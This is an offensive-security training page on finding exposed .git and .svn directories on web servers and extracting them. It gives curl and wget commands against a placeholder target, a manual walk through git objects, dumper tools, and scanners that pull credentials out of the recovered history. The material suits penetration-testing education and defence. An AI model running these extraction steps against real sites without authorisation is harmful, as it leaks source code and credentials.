---
layout: training-page
title: "Insecure Source Code Management — Red Team Academy"
module: "Web Hacking"
tags:
  - source-code-disclosure
  - git
  - svn
  - git-dumper
  - secrets
  - reconnaissance
page_key: "web-source-code-disclosure"
render_with_liquid: false
---

# Insecure Source Code Management

When developers deploy web applications, they sometimes leave version control directories (`.git`, `.svn`, `.hg`) accessible on the web server. These directories contain the full source code history, commit messages, configuration files, and potentially hardcoded credentials. Even without directory listing, individual files within these directories can often be fetched directly, allowing complete source code reconstruction.

## Impact

- **Source code leaks** — Full application logic, business rules, and algorithms
- **Sensitive information exposure** — Hardcoded credentials, API keys, database connection strings
- **Commit history exposure** — Previously exposed secrets that were "removed" are still in git history
- **Internal infrastructure details** — Internal hostnames, IP addresses, paths

## Detection

Check for these paths manually or with automated scanners:

```
# Git
curl http://target.com/.git/config
curl http://target.com/.git/HEAD
curl http://target.com/.git/logs/HEAD

# SVN
curl http://target.com/.svn/wc.db
curl http://target.com/.svn/entries

# Mercurial
curl http://target.com/.hg/

# Bazaar
curl http://target.com/.bzr/
```

A 403 Forbidden response (rather than 404) on `/.git/` is a strong signal that the directory exists but has directory listing disabled. Individual files inside the directory may still be readable.

The Nginx rule that reveals this:

```
location /.git {
  deny all;
}
# Returns 403, not 404 — confirming the .git directory exists
```

## Git — Manual Extraction

### Read Commit History from .git/logs/HEAD

The `.git/logs/HEAD` file records all commits and their hashes:

```
0000000000000000000000000000000000000000 15ca375e...  clone: from https://github.com/example/repo.git
15ca375e... 26e35470...  commit: Initial.
26e35470... 6b4131bb...  commit: Whoops! Remove flag.
6b4131bb... a48ee6d6...  commit: Prevent directory listing.
```

Commit messages like "Remove flag" or "Remove credentials" indicate sensitive data in earlier commits.

### Reconstruct a Commit Object

Git object hashes map to files in `.git/objects/`. The first two characters are the subdirectory, the remainder is the filename:

```
# Initialize a local git repository
git init test
cd test/.git

# Download a commit object (hash: 26e35470...)
mkdir -p objects/26
wget http://target.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c \
     -O objects/26/e35470d38c4d6815bc4426a862d5399f04865c

# Read the commit object
git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
# Output:
# tree 323240a3983045cdc0dec2e88c1358e7998f2e39
# parent 15ca375e54f056a576905b41a417b413c57df6eb
# author Michael <michael@easyctf.com> 1489390329 +0000
```

### Traverse the Tree to Read Files

```
# Download the tree object
mkdir -p objects/32
wget http://target.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39 \
     -O objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39

# List tree contents
git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
# 040000 tree bd083286...   css
# 100644 blob cb613986...   flag.txt
# 040000 tree 14032aab...   fonts

# Download and read the blob (flag.txt)
mkdir -p objects/cb
wget http://target.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f \
     -O objects/cb/6139863967a752f3402b3975e97a84d152fd8f

git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
```

### Extract via .git/index

The index file lists all tracked files and their SHA1 hashes. Use the `gin` Python tool to parse it:

```
pip3 install gin
gin ~/git-repo/.git/index

# Output:
# name = AWS Amazon Bucket S3/README.md
# sha1 = 862a3e58d138d6809405aa062249487bee074b98
```

## Git — Automated Extraction Tools

### git-dumper

```
pip install git-dumper
git-dumper http://target.com/.git ~/dumped-repo
```

### GitTools

```
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
cd /tmp/destdir
git checkout -- .
```

### GoGitDumper

```
go install github.com/c-sto/gogitdumper@latest
gogitdumper -u http://target.com/.git/ -o ./output/.git/
cd output
git log
git checkout
```

### rip-git (DVCS Ripper)

```
perl rip-git.pl -v -u "http://target.com/.git/"
```

### GitHack

```
python GitHack.py http://target.com/.git/
```

## Harvesting Secrets from Recovered Code

After dumping the repository, scan the full history for secrets:

### Nosey Parker

```
git clone https://github.com/trufflesecurity/test_keys
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan --datastore datastore.np ./test_keys/
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report --color always
```

### TruffleHog

```
pip install truffleHog
truffleHog --regex --entropy=False https://github.com/target/repo.git
```

### Gitleaks

```
# Scan a local cloned repo
docker run --rm --name=gitleaks -v /tmp/repo:/code zricethezav/gitleaks -v --repo-path=/code/repo

# Scan a public GitHub repository
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/target/repo.git
```

### Gitrob

```
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob target-org-name
```

## SVN Extraction

SVN stores all version history in `.svn/wc.db`. Download the database and extract file hashes:

```
# Direct file access
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base

# Download the SVN database
wget http://target.com/.svn/wc.db
# Parse: INSERT INTO "NODES" VALUES(1,'trunk/test.txt',...,'$sha1$945a60e...',...);

# Reconstruct the file path:
# Remove $sha1$ prefix, add .svn-base suffix
# First 2 chars of hash = subdirectory under pristine/
http://target.com/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base

# Automated tool
python svn-extractor.py --url "http://target.com"
```

## Resources

- git-dumper — `github.com/arthaud/git-dumper`
- GitTools — `github.com/internetwache/GitTools`
- Nosey Parker — `github.com/praetorian-inc/noseyparker`
- Gitleaks — `github.com/zricethezav/gitleaks`
- TruffleHog — `github.com/trufflesecurity/truffleHog`
- svn-extractor — `github.com/anantshri/svn-extractor`
- Hidden directories and files as a source of sensitive information — bl4de
